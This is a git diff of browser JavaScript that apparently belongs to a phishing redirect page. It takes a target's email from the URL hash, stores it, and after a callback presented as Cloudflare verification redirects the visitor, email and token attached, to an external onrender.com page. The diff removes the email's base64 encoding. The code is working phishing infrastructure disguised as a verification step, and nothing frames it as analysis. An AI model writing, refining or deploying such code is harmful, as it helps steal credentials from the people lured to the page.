@@ -4,11 +4,7 @@ function generateSecureToken(length = 64) {
   return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
 }
 
-// Base64 encode helper (URL-safe)
-function encodeData(data) {
-  return btoa(encodeURIComponent(data)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
-}
-
+// Store data on page load
 window.onload = function() {
   const hash = window.location.hash.substring(1);
   if (hash && hash.includes("@")) {
@@ -18,14 +14,14 @@ window.onload = function() {
   }
 };
 
+// Cloudflare verification callback
 function onVerify(token) {
   const email = sessionStorage.getItem("redirect_email");
   const secureToken = sessionStorage.getItem("redirect_token");
 
   if (email && secureToken) {
-    // Encode email with base64 before adding to URL
-    const encodedEmail = encodeData(email);
-    window.location.href = `https://ronnicf-github-io.onrender.com/adb.html#${encodedEmail}&token=${secureToken}`;
+    // Redirect immediately after verification
+    window.location.href = `https://ronnicf-github-io.onrender.com/adb.html#${email}&token=${secureToken}`;
   } else {
     alert("Verification error. Please refresh and try again.");
   }
